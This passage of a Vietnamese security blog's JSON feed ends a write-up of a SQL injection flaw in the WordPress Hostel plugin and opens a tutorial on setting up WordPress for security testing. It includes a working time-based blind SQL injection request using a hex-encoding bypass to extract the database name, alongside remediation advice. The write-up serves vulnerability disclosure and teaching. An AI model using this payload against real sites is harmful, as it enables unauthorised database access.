03c/span\u003e\n      \u003c/button\u003e\n        \n      \u003cbutton \n        class=\"\n          tw-select-none \n          tw-mx-2 \n          tw-block \n          group-[.is-open]:tw-hidden \n          print:!tw-hidden\" \n        disabled\n        aria-hidden=\"true\"\u003e\u003csvg class=\"icon\"\n    xmlns=\"http://www.w3.org/2000/svg\" viewBox=\"0 0 512 512\"\u003e\u003c!-- Font Awesome Free 5.15.4 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) --\u003e\u003cpath d=\"M328 256c0 39.8-32.2 72-72 72s-72-32.2-72-72 32.2-72 72-72 72 32.2 72 72zm104-72c-39.8 0-72 32.2-72 72s32.2 72 72 72 72-32.2 72-72-32.2-72-72-72zm-352 0c-39.8 0-72 32.2-72 72s32.2 72 72 72 72-32.2 72-72-32.2-72-72-72z\"/\u003e\u003c/svg\u003e\u003c/button\u003e\n    \u003c/div\u003e\n  \u003c/div\u003e\n  \u003cpre style=\"counter-reset: codeblock;\" class=\"tw-block tw-m-0 tw-p-0\"\u003e\u003ccode \n    id=\"codeblock-id-33\" \n    class=\"\n      chroma \n      !tw-block \n      tw-p-0\n      tw-m-0\n      tw-transition-[max-height] \n      tw-duration-500 \n      tw-ease-in-out \n      group-[.is-closed]:!tw-max-h-0 \n      group-[.is-wrap]:tw-text-wrap\n      tw-overflow-y-hidden\n      tw-overflow-x-auto\n      tw-scrollbar-thin\n      \"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nf\"\u003eGET\u003c/span\u003e \u003cspan class=\"nn\"\u003e/wp-admin/admin.php?page=wphostel_bookings\u0026amp;type=past\u0026amp;ob=tB.status,(SELECT+IF(SUBSTRING(DATABASE(),1,1)=0x77,SLEEP(5),0))\u0026amp;dir=ASC\u003c/span\u003e \u003cspan class=\"kr\"\u003eHTTP\u003c/span\u003e\u003cspan class=\"o\"\u003e/\u003c/span\u003e\u003cspan class=\"m\"\u003e1.1\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\n\u003c/div\u003e\n\u003cp\u003eThành công bypass =\u0026gt; có thể trích xuất tên database.\u003c/p\u003e\n\u003cfigure\u003e\u003cimg src=\"/2025-09-21-cve-2025-39566/ord_bypass.png\"\n    alt=\"Hex encoding bypass\"\u003e\u003cfigcaption\u003e\n      \u003cp\u003eHex encoding bypass\u003c/p\u003e\n    \u003c/figcaption\u003e\n\u003c/figure\u003e\n\n\u003ch2 id=\"remediation\" class=\"headerLink\"\u003e\n    \u003ca href=\"#remediation\" class=\"header-mark\"\u003e\u003c/a\u003e13 Remediation\u003c/h2\u003e\u003cp\u003eCập nhật lên \u003cstrong\u003eHostel Plugin v1.1.5.7\u003c/strong\u003e hoặc mới hơn\u003c/p\u003e\n\u003ch2 id=\"takeaways\" class=\"headerLink\"\u003e\n    \u003ca href=\"#takeaways\" class=\"header-mark\"\u003e\u003c/a\u003e14 Takeaways\u003c/h2\u003e\u003cul\u003e\n\u003cli\u003e\u003ccode\u003esanitize_text_field()\u003c/code\u003e ≠ chống \u003cstrong\u003eSQL Injection\u003c/strong\u003e\u003c/li\u003e\n\u003cli\u003eCần phân biệt rõ: lọc input cho HTML vs cho SQL\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch2 id=\"references\" class=\"headerLink\"\u003e\n    \u003ca href=\"#references\" class=\"header-mark\"\u003e\u003c/a\u003e15 References\u003c/h2\u003e\u003cp\u003e\u003ca href=\"https://portswigger.net/web-security/sql-injection/cheat-sheet\" target=\"_blank\" rel=\"noopener noreferrer\"\u003eSQL Injection Cheat Sheet – PortSwigger\u003c/a\u003e\u003c/p\u003e\n\u003cp\u003e\u003ca href=\"https://patchstack.com/database/wordpress/plugin/hostel/vulnerability/wordpress-hostel-1-1-5-6-sql-injection-vulnerability?_s_id=cve\" target=\"_blank\" rel=\"noopener noreferrer\"\u003eWordPress Hostel Plugin \u0026lt;= 1.1.5.6 is vulnerable to SQL Injection - patchstack\u003c/a\u003e\u003c/p\u003e",
        "language": "vi"
    },
    {
        "title" : "WordPress Local and Debugging",
        "date_published" : "2025-08-21T09:00:00+07:00",
        "date_modified" : "2025-10-21T00:19:55+07:00",
        "id" : "http://localhost:1313/vi/2025-08-21-wordpress-local-and-debugging/",
        "url" : "http://localhost:1313/vi/2025-08-21-wordpress-local-and-debugging/",
        "content_html" : "\u003cp\u003e\u003cstrong\u003eWordPress\u003c/strong\u003e là một hệ thống quản lý nội dung (CMS) mạnh mẽ và phổ biến nhất cho phép bạn tạo, quản lý và tùy chỉnh các trang web và blog một cách dễ dàng. Nó là open-source CMS, được xây dựng trên PHP và sử dụng cơ sở dữ liệu MySQL hoặc Maria DB.\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003eRa đời năm 2003, ban đầu chỉ để viết blog, sau đó phát triển thành nền tảng tạo website, cửa hàng online, diễn đàn, landing page…\u003c/li\u003e\n\u003cli\u003eHiện nay, hơn 40% website trên thế giới chạy bằng WordPress.\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003eCó 2 phiên bản WordPress:\u003c/p\u003e\n\u003col\u003e\n\u003cli\u003eWordPress.com\u003c/li\u003e\n\u003c/ol\u003e\n\u003cul\u003e\n\u003cli\u003eDịch vụ hosting do Automattic cung cấp\u003c/li\u003e\n\u003cli\u003eBạn chỉ cần đăng ký tài khoản, không phải cài đặt\u003c/li\u003e\n\u003cli\u003eHạn chế tùy chỉnh, muốn nâng cao thì phải trả phí\u003c/li\u003e\n\u003c/ul\u003e\n\u003col start=\"2\"\u003e\n\u003cli\u003eWordPress.org\u003c/li\u003e\n\u003c/ol\u003e\n\u003cul\u003e\n\u003cli\u003eMã nguồn mở, bạn tự tải về và cài đặt lên hosting/server riêng\u003c/li\u003e\n\u003cli\u003eTùy chỉnh toàn diện, có thể cài plugin, theme, viết code, tạo website theo ý mình\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch2 id=\"ecosystem\" class=\"headerLink\"\u003e\n    \u003ca href=\"#ecosystem\" class=\"header-mark\"\u003e\u003c/a\u003e41 Ecosystem\u003c/h2\u003e\u003cul\u003e\n\u003cli\u003eCore: CMS chính\u003c/li\u003e\n\u003cli\u003ePlugin: Một phần mềm bổ sung có thể được cài đặt trên trang web WordPress để mở rộng chức năng của nó và thêm các tính năng mới\u003c/li\u003e\n\u003cli\u003eThemes: Một phần mềm bổ sung đại diện cho sự xuất hiện trực quan và bố cục của một trang web WordPress\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch2 id=\"why-wordpress-hacking\" class=\"headerLink\"\u003e\n    \u003ca href=\"#why-wordpress-hacking\" class=\"header-mark\"\u003e\u003c/a\u003e42 Why WordPress Hacking?\u003c/h2\u003e\u003cp\u003e\u003ca href=\"https://patchstack.com/whitepaper/state-of-wordpress-security-in-2024\" target=\"_blank\" rel=\"noopener noreferrer\"\u003eState of WordPress Security in 2024\u003c/a\u003e\u003c/p\u003e\n\u003ch3 id=\"most-popular\" class=\"headerLink\"\u003e\n    \u003ca href=\"#most-popular\" class=\"header-mark\"\u003e\u003c/a\u003e42.1 Most Popular\u003c/h3\u003e\u003cul\u003e\n\u003cli\u003eHiện tại hơn 40% website trên toàn thế giới chạy WordPress\u003c/li\u003e\n\u003cli\u003eNghĩa là hacker chỉ cần tìm ra một lỗ hổng phổ biến =\u0026gt; có thể khai thác hàng triệu site cùng lúc\u003c/li\u003e\n\u003cli\u003eGiống như \u003ccode\u003e“cá nhiều thì chài ở đó”\u003c/code\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch3 id=\"plugin-and-theme\" class=\"headerLink\"\u003e\n    \u003ca href=\"#plugin-and-theme\" class=\"header-mark\"\u003e\u003c/a\u003e42.2 Plugin and Theme\u003c/h3\u003e\u003cul\u003e\n\u003cli\u003eWordPress Core đã được xem xét trong 1 thời gian dài bởi hàng ngàn \u003cstrong\u003edevelopers\u003c/strong\u003e và \u003cstrong\u003eresearchers\u003c/strong\u003e. Kết quả là rất khó để kẻ tấn công có thể đột nhập vào\u003c/li\u003e\n\u003cli\u003eTuy nhiên, có hàng chục ngàn plugin và theme từ nhiều nguồn, chất lượng không đồng đều được sử dụng\u003c/li\u003e\n\u003cli\u003eNhiều plugin code bảo mật kém, không còn được cập nhật. Hacker chỉ cần scan plugin/theme để tìm version lỗi thời, rồi khai thác\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch2 id=\"setup-wordpress-for-hacking\" class=\"headerLink\"\u003e\n    \u003ca href=\"#setup-wordpress-for-hacking\" class=\"header-mark\"\u003e\u003c/a\u003e43 Setup WordPress for Hacking\u003c/h2\u003e\u003cp\u003eCó rất nhiều cách để setup WorkPress, tìm kiếm bằng \u003cstrong\u003eGoogle\u003c/strong\u003e có thể cung cấp nhiều bài viết về nó. Ở đây tôi sẽ setup trên máy ảo \u003cstrong\u003eUbuntu (22.04)\u003c/strong\u003e:\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003eKhông ảnh hưởng đến các dịch vụ của máy thật\u003c/li\u003e\n\u003cli\u003eWordPress tương đối nhẹ để sử dụng trên máy ảo\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch3 id=\"install-and-configure-wordpress\" class=\"headerLink\"\u003e\n    \u003ca href=\"#install-and-configure-wordpress\" class=\"header-mark\"\u003e\u003c/a\u003e43.1 Install and configure WordPress\u003c/h3\u003e\u003ch4 id=\"install-dependencies\" class=\"headerLink\"\u003e\n    \u003ca href=\"#install-dependencies\" class=\"header-mark\"\u003e\u003c/a\u003e43.1.1 Install Dependencies\u003c/h4\u003e\u003cp\u003eCài toàn bộ stack cần thiết để chạy WordPress (web server + database + PHP + các extension quan trọng).\u003c/p\u003e\n\u003cdiv class=\"code-block highlight is-closed show-line-numbers  tw-group tw-my-2\"\u003e\n  \u003cdiv class=\"\n    \n    tw-flex \n    tw-flex-row\n    tw-flex-1 \n    tw-justify-between \n    tw-w-full tw-bg-bgColor-secondary\n    \"\u003e      \n    \u003cbutton \n      class=\"\n        code-block-button\n        tw-mx-2 \n        tw-flex\n        tw-flex-row\n        tw-flex-1\"\n      aria-hidden=\"true\"\u003e\n          \u003cdiv class=\"group-[.is-open]:tw-rotate-90 tw-transition-[transform] tw-duration-500 tw-ease-in-out print:!tw-hidden tw-w-min tw-h-min tw-my-1 tw-mx-1\"\u003e\u003csvg class=\"icon\"\n    xmlns=\"http://www.w3.org/2000/svg\" viewBox=\"0 0 320 512\"\u003e\u003c!-- Font Awesome Free 5.15.4 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) --\u003e\u003cpath d=\"M285.476 272.971L91.132 467.314c-9.373 9.373-24.569 9.373-33.941 0l-22.667-22.667c-9.357-9.357-9.375-24.522-.04-33.901L188.505 256 34.484 101.255c-9.335-9.379-9.317-24.544.04-33.901l22.667-22.667c9.373-9.373 24.569-9.373 33.941 0L285.475 239.03c9.373 9.372 9.373 24.568.001 33.941z\"/\u003e\u003c/svg\u003e\u003c/div\u003e\n          \u003cp class=\"tw-select-none !tw-my-1\"